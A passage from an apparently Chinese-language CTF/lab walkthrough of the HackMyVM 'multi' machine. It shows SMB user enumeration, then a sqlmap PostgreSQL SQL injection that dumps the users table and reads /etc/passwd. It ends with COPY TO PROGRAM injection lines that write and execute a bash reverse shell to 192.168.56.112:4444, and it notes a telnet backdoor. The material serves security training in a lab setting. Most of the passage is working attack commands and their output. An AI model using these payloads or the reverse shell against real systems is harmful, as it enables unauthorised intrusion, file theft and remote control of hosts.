</span><br><span class="line"></span><br><span class="line">[E] Can&#x27;t understand response:                                                                                                                                                                                    </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                                                                        </span><br><span class="line">//192.168.56.111/IPC$   Mapping: N/A Listing: N/A Writing: N/A</span><br><span class="line"></span><br><span class="line"> ===========================( Password Policy Information for 192.168.56.111 )===========================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[E] Unexpected error from polenum:                                                                                                                                                                                </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line"></span><br><span class="line">[+] Attaching to 192.168.56.111 using a NULL share</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 139/SMB...</span><br><span class="line"></span><br><span class="line">        [!] Protocol failed: (&#x27;unpack requires a buffer of 1 bytes&#x27;, &quot;When unpacking field &#x27;SecurityMode | &lt;B | b&#x27;&#x27;[:1]&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">[+] Trying protocol 445/SMB...</span><br><span class="line"></span><br><span class="line">        [!] Protocol failed: SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Retieved partial password policy with rpcclient:                                                                                                                                                              </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">Password Complexity: Disabled                                                                                                                                                                                     </span><br><span class="line">Minimum Password Length: 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> ======================================( Groups on 192.168.56.111 )======================================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+] Getting builtin groups:                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+]  Getting builtin group memberships:                                                                                                                                                                           </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+]  Getting local groups:                                                                                                                                                                                        </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+]  Getting local group memberships:                                                                                                                                                                             </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+]  Getting domain groups:                                                                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[+]  Getting domain group memberships:                                                                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line"> =================( Users on 192.168.56.111 via RID cycling (RIDS: 500-550,1000-1050) )=================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">[I] Found new SID:                                                                                                                                                                                                </span><br><span class="line">S-1-22-1                                                                                                                                                                                                          </span><br><span class="line"></span><br><span class="line">[I] Found new SID:                                                                                                                                                                                                </span><br><span class="line">S-1-5-32                                                                                                                                                                                                          </span><br><span class="line"></span><br><span class="line">[I] Found new SID:                                                                                                                                                                                                </span><br><span class="line">S-1-5-32                                                                                                                                                                                                          </span><br><span class="line"></span><br><span class="line">[I] Found new SID:                                                                                                                                                                                                </span><br><span class="line">S-1-5-32                                                                                                                                                                                                          </span><br><span class="line"></span><br><span class="line">[I] Found new SID:                                                                                                                                                                                                </span><br><span class="line">S-1-5-32                                                                                                                                                                                                          </span><br><span class="line"></span><br><span class="line">[+] Enumerating users using SID S-1-22-1 and logon username &#x27;&#x27;, password &#x27;&#x27;                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">S-1-22-1-1000 Unix User\todd (Local User)                                                                                                                                                                         </span><br><span class="line">S-1-22-1-1001 Unix User\xiao (Local User)</span><br><span class="line">S-1-22-1-1002 Unix User\secure_user (Local User)</span><br><span class="line">S-1-22-1-1003 Unix User\samba_user (Local User)</span><br><span class="line"></span><br><span class="line">[+] Enumerating users using SID S-1-5-32 and logon username &#x27;&#x27;, password &#x27;&#x27;                                                                                                                                       </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                                                                                 </span><br><span class="line">S-1-5-32-545 BUILTIN\Users (Local Group)</span><br><span class="line">S-1-5-32-546 BUILTIN\Guests (Local Group)</span><br><span class="line">S-1-5-32-547 BUILTIN\Power Users (Local Group)</span><br><span class="line">S-1-5-32-548 BUILTIN\Account Operators (Local Group)</span><br><span class="line">S-1-5-32-549 BUILTIN\Server Operators (Local Group)</span><br><span class="line">S-1-5-32-550 BUILTIN\Print Operators (Local Group)</span><br><span class="line"></span><br><span class="line">[+] Enumerating users using SID S-1-5-21-2648146443-3642655822-4195795931 and logon username &#x27;&#x27;, password &#x27;&#x27;                                                                                                      </span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">S-1-5-21-2648146443-3642655822-4195795931-501 MULTI\nobody (Local User)                                                                                                                                           </span><br><span class="line">S-1-5-21-2648146443-3642655822-4195795931-513 MULTI\None (Domain Group)</span><br><span class="line"></span><br><span class="line"> ==============================( Getting printer info for 192.168.56.111 )==============================</span><br><span class="line">                                                                                                                                                                                                                  </span><br><span class="line">No printers returned.                                                                                                                                                                                             </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enum4linux complete on Tue Dec  9 07:35:55 2025</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>两个关键信息</p>
<p>有效的用户名列表 </p>
<p>S-1-22-1-1000 Unix User\todd (Local User)<br>S-1-22-1-1001 Unix User\xiao (Local User)<br>S-1-22-1-1002 Unix User\secure_user (Local User)<br>S-1-22-1-1003 Unix User\samba_user (Local User)</p>
<p>和 一个可读的共享文件夹</p>
<p>&#x2F;&#x2F;192.168.56.111&#x2F;secure_share   Mapping: OK Listing: OK Writing: N&#x2F;A    </p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209210007377.png" alt="image-20251209210007377"></p>
<p>应该跟bettercap相关但是还没法利用</p>
<p>继续下一个端口的测试</p>
<h4 id="nfs"><a href="#nfs" class="headerlink" title="nfs"></a>nfs</h4><p><img src="/../imgs/$%7Bfiilename%7D/image-20251209210355692.png" alt="image-20251209210355692"></p>
<p>这个 NFS 共享被配置为只允许本机 (localhost&#x2F;127.0.0.1) 挂载</p>
<h4 id="端口-28080-Python-Werkzeug-Web-服务"><a href="#端口-28080-Python-Werkzeug-Web-服务" class="headerlink" title="端口 28080 (Python&#x2F;Werkzeug Web 服务)"></a>端口 28080 (Python&#x2F;Werkzeug Web 服务)</h4><p><img src="/../imgs/$%7Bfiilename%7D/image-20251209210750969.png" alt="image-20251209210750969"></p>
<p>随便输什么都能登录,里面有一个用户查询功能</p>
<p>去查到smb发现的几个用户只有xiao会弹出相关信息</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209211018505.png" alt="image-20251209211018505"></p>
<p>有sql注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# sqlmap -r 1 -p keyword -dbs   </span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                                                               </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.8.9#stable&#125;                                                                                                                                                                   </span><br><span class="line">|_ -| . [.]     | .&#x27;| . |                                                                                                                                                                                  </span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|                                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:24:27 /2025-12-09/</span><br><span class="line"></span><br><span class="line">[08:24:27] [INFO] parsing HTTP request from &#x27;1&#x27;</span><br><span class="line">[08:24:27] [INFO] resuming back-end DBMS &#x27;postgresql&#x27; </span><br><span class="line">[08:24:27] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: keyword (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: keyword=1&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: keyword=1&#x27; UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(CHR(112)||CHR(72)||CHR(101)||CHR(86)||CHR(82)||CHR(110)||CHR(90)||CHR(101)||CHR(71)||CHR(113)||CHR(105)||CHR(110)||CHR(114)||CHR(119)||CHR(97)||CHR(68)||CHR(88)||CHR(112)||CHR(111)||CHR(117)||CHR(65)||CHR(80)||CHR(109)||CHR(107)||CHR(83)||CHR(72)||CHR(108)||CHR(117)||CHR(66)||CHR(79)||CHR(121)||CHR(71)||CHR(101)||CHR(110)||CHR(85)||CHR(68)||CHR(88)||CHR(105)||CHR(114)||CHR(88))||(CHR(113)||CHR(118)||CHR(98)||CHR(122)||CHR(113)),NULL-- FHqn</span><br><span class="line">---</span><br><span class="line">[08:24:27] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[08:24:27] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes</span><br><span class="line">[08:24:27] [INFO] fetching database (schema) names</span><br><span class="line">[08:24:28] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[08:24:28] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique</span><br><span class="line">[08:24:28] [WARNING] the SQL query provided does not return any output</span><br><span class="line">[08:24:28] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#x27;--no-cast&#x27; or switch &#x27;--hex&#x27;</span><br><span class="line">[08:24:28] [INFO] fetching number of databases</span><br><span class="line">[08:24:28] [WARNING] time-based comparison requires larger statistical model, please wait.......................... (done)                                                                                </span><br><span class="line">[08:24:28] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions </span><br><span class="line">do you want sqlmap to try to optimize value(s) for DBMS delay responses (option &#x27;--time-sec&#x27;)? [Y/n] </span><br><span class="line"></span><br><span class="line">[08:24:58] [INFO] adjusting time delay to 1 second due to good response times</span><br><span class="line">3</span><br><span class="line">[08:24:58] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                                                                   </span><br><span class="line"></span><br><span class="line">[08:24:59] [INFO] retrieved: </span><br><span class="line">[08:24:59] [INFO] retrieved: </span><br><span class="line">[08:24:59] [INFO] falling back to current database</span><br><span class="line">[08:24:59] [INFO] fetching current database</span><br><span class="line">[08:24:59] [WARNING] on PostgreSQL you&#x27;ll need to use schema names for enumeration as the counterpart to database names on other DBMSes</span><br><span class="line">available databases [1]:</span><br><span class="line">[*] public</span><br><span class="line"></span><br><span class="line">[08:24:59] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span><br><span class="line">[08:24:59] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:24:59 /2025-12-09/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>public库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# sqlmap -r 1 -p keyword -D public --tables</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                                                               </span><br><span class="line"> ___ ___[)]_____ ___ ___  &#123;1.8.9#stable&#125;                                                                                                                                                                   </span><br><span class="line">|_ -| . [&#x27;]     | .&#x27;| . |                                                                                                                                                                                  </span><br><span class="line">|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:27:41 /2025-12-09/</span><br><span class="line"></span><br><span class="line">[08:27:41] [INFO] parsing HTTP request from &#x27;1&#x27;</span><br><span class="line">[08:27:41] [INFO] resuming back-end DBMS &#x27;postgresql&#x27; </span><br><span class="line">[08:27:41] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: keyword (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: keyword=1&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: keyword=1&#x27; UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(CHR(112)||CHR(72)||CHR(101)||CHR(86)||CHR(82)||CHR(110)||CHR(90)||CHR(101)||CHR(71)||CHR(113)||CHR(105)||CHR(110)||CHR(114)||CHR(119)||CHR(97)||CHR(68)||CHR(88)||CHR(112)||CHR(111)||CHR(117)||CHR(65)||CHR(80)||CHR(109)||CHR(107)||CHR(83)||CHR(72)||CHR(108)||CHR(117)||CHR(66)||CHR(79)||CHR(121)||CHR(71)||CHR(101)||CHR(110)||CHR(85)||CHR(68)||CHR(88)||CHR(105)||CHR(114)||CHR(88))||(CHR(113)||CHR(118)||CHR(98)||CHR(122)||CHR(113)),NULL-- FHqn</span><br><span class="line">---</span><br><span class="line">[08:27:41] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[08:27:41] [INFO] fetching tables for database: &#x27;public&#x27;</span><br><span class="line">[08:27:41] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">Database: public</span><br><span class="line">[1 table]</span><br><span class="line">+-------+</span><br><span class="line">| users |</span><br><span class="line">+-------+</span><br><span class="line"></span><br><span class="line">[08:27:41] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span><br><span class="line">[08:27:41] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:27:41 /2025-12-09/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>users表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# sqlmap -r 1 -p keyword -D public -T users --columns  </span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                                                               </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.9#stable&#125;                                                                                                                                                                   </span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |                                                                                                                                                                                  </span><br><span class="line">|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:28:34 /2025-12-09/</span><br><span class="line"></span><br><span class="line">[08:28:34] [INFO] parsing HTTP request from &#x27;1&#x27;</span><br><span class="line">[08:28:34] [INFO] resuming back-end DBMS &#x27;postgresql&#x27; </span><br><span class="line">[08:28:34] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: keyword (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: keyword=1&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: keyword=1&#x27; UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(CHR(112)||CHR(72)||CHR(101)||CHR(86)||CHR(82)||CHR(110)||CHR(90)||CHR(101)||CHR(71)||CHR(113)||CHR(105)||CHR(110)||CHR(114)||CHR(119)||CHR(97)||CHR(68)||CHR(88)||CHR(112)||CHR(111)||CHR(117)||CHR(65)||CHR(80)||CHR(109)||CHR(107)||CHR(83)||CHR(72)||CHR(108)||CHR(117)||CHR(66)||CHR(79)||CHR(121)||CHR(71)||CHR(101)||CHR(110)||CHR(85)||CHR(68)||CHR(88)||CHR(105)||CHR(114)||CHR(88))||(CHR(113)||CHR(118)||CHR(98)||CHR(122)||CHR(113)),NULL-- FHqn</span><br><span class="line">---</span><br><span class="line">[08:28:34] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[08:28:34] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;public&#x27;</span><br><span class="line">[08:28:34] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[3 columns]</span><br><span class="line">+----------+------+</span><br><span class="line">| Column   | Type |</span><br><span class="line">+----------+------+</span><br><span class="line">| email    | text |</span><br><span class="line">| id       | int4 |</span><br><span class="line">| username | text |</span><br><span class="line">+----------+------+</span><br><span class="line"></span><br><span class="line">[08:28:34] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span><br><span class="line">[08:28:34] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:28:34 /2025-12-09/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>三个字段text,int4,text</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# sqlmap -r 1 -p keyword -D public -T users --dump</span><br><span class="line"></span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                                                               </span><br><span class="line"> ___ ___[&#x27;]_____ ___ ___  &#123;1.8.9#stable&#125;                                                                                                                                                                   </span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |                                                                                                                                                                                  </span><br><span class="line">|___|_  [.]_|_|_|__,|  _|                                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:41:40 /2025-12-09/</span><br><span class="line"></span><br><span class="line">[08:41:40] [INFO] parsing HTTP request from &#x27;1&#x27;</span><br><span class="line">[08:41:40] [INFO] resuming back-end DBMS &#x27;postgresql&#x27; </span><br><span class="line">[08:41:40] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: keyword (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: keyword=1&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: keyword=1&#x27; UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(CHR(112)||CHR(72)||CHR(101)||CHR(86)||CHR(82)||CHR(110)||CHR(90)||CHR(101)||CHR(71)||CHR(113)||CHR(105)||CHR(110)||CHR(114)||CHR(119)||CHR(97)||CHR(68)||CHR(88)||CHR(112)||CHR(111)||CHR(117)||CHR(65)||CHR(80)||CHR(109)||CHR(107)||CHR(83)||CHR(72)||CHR(108)||CHR(117)||CHR(66)||CHR(79)||CHR(121)||CHR(71)||CHR(101)||CHR(110)||CHR(85)||CHR(68)||CHR(88)||CHR(105)||CHR(114)||CHR(88))||(CHR(113)||CHR(118)||CHR(98)||CHR(122)||CHR(113)),NULL-- FHqn</span><br><span class="line">---</span><br><span class="line">[08:41:40] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[08:41:40] [INFO] fetching columns for table &#x27;users&#x27; in database &#x27;public&#x27;</span><br><span class="line">[08:41:40] [INFO] fetching entries for table &#x27;users&#x27; in database &#x27;public&#x27;</span><br><span class="line">[08:41:40] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">Database: public</span><br><span class="line">Table: users</span><br><span class="line">[4 entries]</span><br><span class="line">+----+-----------------+----------+</span><br><span class="line">| id | email           | username |</span><br><span class="line">+----+-----------------+----------+</span><br><span class="line">| 1  | admin@multi.hmv | admin    |</span><br><span class="line">| 2  | guest@multi.hmv | guest    |</span><br><span class="line">| 3  | test@multi.hmv  | test     |</span><br><span class="line">| 4  | xiao@multi.hmv  | xiao     |</span><br><span class="line">+----+-----------------+----------+</span><br><span class="line"></span><br><span class="line">[08:41:40] [INFO] table &#x27;public.users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.56.111/dump/public/users.csv&#x27;</span><br><span class="line">[08:41:40] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span><br><span class="line">[08:41:40] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:41:40 /2025-12-09/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>现在知道为什么只能查到xiao了其实就是巧了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/myift/bachang/hvm/mutli]</span><br><span class="line">└─# sqlmap -r 1 -p keyword --is-dba</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                                                               </span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.8.9#stable&#125;                                                                                                                                                                   </span><br><span class="line">|_ -| . [)]     | .&#x27;| . |                                                                                                                                                                                  </span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|                                                                                                                                                                                  </span><br><span class="line">      |_|V...       |_|   https://sqlmap.org                                                                                                                                                               </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 08:46:36 /2025-12-09/</span><br><span class="line"></span><br><span class="line">[08:46:36] [INFO] parsing HTTP request from &#x27;1&#x27;</span><br><span class="line">[08:46:36] [INFO] resuming back-end DBMS &#x27;postgresql&#x27; </span><br><span class="line">[08:46:36] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: keyword (POST)</span><br><span class="line">    Type: stacked queries</span><br><span class="line">    Title: PostgreSQL &gt; 8.1 stacked queries (comment)</span><br><span class="line">    Payload: keyword=1&#x27;;SELECT PG_SLEEP(5)--</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 3 columns</span><br><span class="line">    Payload: keyword=1&#x27; UNION ALL SELECT NULL,(CHR(113)||CHR(118)||CHR(120)||CHR(107)||CHR(113))||(CHR(112)||CHR(72)||CHR(101)||CHR(86)||CHR(82)||CHR(110)||CHR(90)||CHR(101)||CHR(71)||CHR(113)||CHR(105)||CHR(110)||CHR(114)||CHR(119)||CHR(97)||CHR(68)||CHR(88)||CHR(112)||CHR(111)||CHR(117)||CHR(65)||CHR(80)||CHR(109)||CHR(107)||CHR(83)||CHR(72)||CHR(108)||CHR(117)||CHR(66)||CHR(79)||CHR(121)||CHR(71)||CHR(101)||CHR(110)||CHR(85)||CHR(68)||CHR(88)||CHR(105)||CHR(114)||CHR(88))||(CHR(113)||CHR(118)||CHR(98)||CHR(122)||CHR(113)),NULL-- FHqn</span><br><span class="line">---</span><br><span class="line">[08:46:36] [INFO] the back-end DBMS is PostgreSQL</span><br><span class="line">back-end DBMS: PostgreSQL</span><br><span class="line">[08:46:36] [INFO] testing if current user is DBA</span><br><span class="line">current user is DBA: True</span><br><span class="line">[08:46:36] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.56.111&#x27;</span><br><span class="line">[08:46:36] [WARNING] your sqlmap version is outdated</span><br><span class="line"></span><br><span class="line">[*] ending @ 08:46:36 /2025-12-09/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们拥有数据库最高权限DBA</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209215054238.png" alt="image-20251209215054238"></p>
<p>但是并不能执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1 -p keyword --file-read &quot;/etc/passwd&quot;</span><br></pre></td></tr></table></figure>

<p>还是失败</p>
<p>原因</p>
<p>sqlmap的自动化脚本在 PostgreSQL 13 上遇到了兼容性问题（因为它试图使用旧的方法注入 <code>.so</code> 文件，而这在 Postgres 13 上被限制了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1 --batch --technique=U -p keyword --sql-query &quot;SELECT pg_read_file(&#x27;/etc/passwd&#x27;, 0, 1000000)&quot;</span><br></pre></td></tr></table></figure>

<p>这样既可读出</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209220722848.png" alt="image-20251209220722848"></p>
<p>还有一种更不容易被限制的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1 -p keyword --sql-query &quot;SELECT lo_import(&#x27;/etc/passwd&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209220857108.png" alt="image-20251209220857108"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将 16393 替换为你实际得到的 OID</span><br><span class="line">sqlmap -r 1 -p keyword --sql-query &quot;SELECT lo_get(41022)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209221205017.png" alt="image-20251209221205017"><br>只不过是导出的是二进制数据我们将其编译一下即可</p>
<p>xiao (UID 1001): <code>xiao:x:1001:1001::/home/xiao:/bin/bash</code></p>
<p> 这是一个普通用户，并且拥有 <code>/bin/bash</code>（可以登录 Shell）。</p>
<p>todd (UID 1000)<code>todd:x:1000:1000:,,,:/home/todd:/bin/bash</code></p>
<p>这也是一个可以登录的用户。</p>
<p>secure_user (UID 1002): <code>secure_user:x:1002:1002::/home/secure_user:/bin/bash</code></p>
<p>同样拥有 Shell 权限。</p>
<p>postgres (UID 112): <code>postgres:x:112:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</code></p>
<p>数据库管理员也有 Shell 权限！这意味着如果我们反弹 Shell 成功，我们会成为 <code>postgres</code> 用户。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209222133121.png" alt="image-20251209222133121"></p>
<p>不能利用上面的方式读出用户的ssh密钥</p>
<p>但是我们可以写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;COPY (SELECT $$_$$) TO PROGRAM &#x27;echo &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.112/4444 0&gt;&amp;1&quot; &gt; /tmp/rev.sh&#x27;;--</span><br><span class="line">&#x27;;COPY (SELECT $$_$$) TO PROGRAM &#x27;chmod +x /tmp/rev.sh&#x27;;--</span><br><span class="line">&#x27;;COPY (SELECT $$_$$) TO PROGRAM &#x27;/bin/bash /tmp/rev.sh&#x27;;--</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209223948471.png" alt="image-20251209223948471"></p>
<p>成功拿到shell</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20251209224442070.png" alt="image-20251209224442070"></p>
<p>得到关键信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;ENABLE_BACKDOOR&#x27; &gt; /etc/default/telnet</span><br></pre></td></tr></table></figure>

<p>telnet有后门</p>
<p>审查自定义登录脚本</p>
